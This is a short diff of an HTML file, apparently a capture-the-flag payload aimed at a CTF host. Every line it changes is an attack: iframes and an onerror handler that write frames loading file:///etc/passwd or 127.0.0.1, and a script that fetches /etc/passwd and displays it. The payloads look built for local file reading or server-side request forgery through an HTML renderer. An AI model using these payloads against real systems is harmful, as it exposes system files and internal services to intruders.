@@ -7,8 +7,8 @@
     <title>Document</title>
 </head>
 <body>
-    <iframe src="file:///etc/passwd" width="400" height="400">
-        <img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
+    <iframe src="https://hiddensecret.vkactf.ru/" width="400" height="400">
+        <img src onerror="document.write(`<iframe src='file:///etc/passwd'></iframe>`)">
 
-        <script>fetch('localhost').then(r=>r.text()).then(s=>alert(s))</script>
+        <script>fetch('file:///etc/passwd').then(r=>r.text()).then(s=>alert(s))</script>
 </html>
